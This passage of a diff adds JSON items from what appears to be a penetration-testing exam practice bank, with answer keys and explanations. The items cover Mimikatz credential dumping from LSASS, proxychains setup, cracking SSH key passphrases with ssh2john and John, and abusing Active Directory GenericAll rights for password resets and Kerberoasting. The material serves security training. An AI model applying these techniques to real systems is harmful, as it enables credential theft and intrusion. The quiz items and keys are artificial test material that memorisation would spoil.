+        "mimikatz # kerberos::list",
+        "mimikatz # lsadump::sam"
+      ],
+      "correct": 1,
+      "explanation": "The sekurlsa::logonpasswords command extracts credentials from the LSASS process memory, including cleartext passwords (if WDigest is enabled), NTLM hashes, and Kerberos tickets for all logged-on users. This is the primary credential harvesting command in Mimikatz.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 148,
+      "domain": 5,
+      "objective": "5.3",
+      "difficulty": "easy",
+      "question": "What configuration file must be edited on Kali Linux to specify the SOCKS proxy port when using proxychains?",
+      "options": [
+        "/etc/proxychains4.conf",
+        "/etc/network/interfaces",
+        "/etc/ssh/sshd_config",
+        "/etc/hosts"
+      ],
+      "correct": 0,
+      "explanation": "The /etc/proxychains4.conf file (or /etc/proxychains.conf on older versions) configures the proxy type, port, and chain behavior for proxychains. The default SOCKS proxy entry is typically 'socks5 127.0.0.1 1080' and must match your SSH dynamic port forward or SOCKS server port.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 149,
+      "domain": 5,
+      "objective": "5.2",
+      "difficulty": "medium",
+      "question": "You have compromised a Linux host and found SSH private keys in a user's .ssh directory. The key has a passphrase. Which tool can crack the SSH key passphrase?",
+      "options": [
+        "hashcat with mode 22 directly on the key file",
+        "ncrack against the SSH service",
+        "hydra against the SSH service directly",
+        "ssh2john.py to extract the hash, then john to crack it"
+      ],
+      "correct": 3,
+      "explanation": "ssh2john.py converts the passphrase-protected SSH private key into a hash format that John the Ripper can process. Once converted, John can perform dictionary or brute-force attacks against the hash to recover the passphrase without needing to interact with the SSH service.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 150,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "hard",
+      "question": "In an Active Directory environment, you have compromised a user who has GenericAll permissions on another user account. What attack can you perform?",
+      "options": [
+        "Reset the target user's password, set an SPN for Kerberoasting, or modify their group membership",
+        "Only view the target user's login history",
+        "Only disable the target user's account",
+        "Only read the target user's email"
+      ],
+      "correct": 0,
+      "explanation": "GenericAll grants full control over an AD object. For a user object, this includes resetting their password without knowing the current one, setting a Service Principal Name to enable Kerberoasting, adding them to groups, or modifying any attribute. BloodHound highlights these dangerous ACL edges.",
+      "link": "start-here.html"
+    }
+  ]
+}
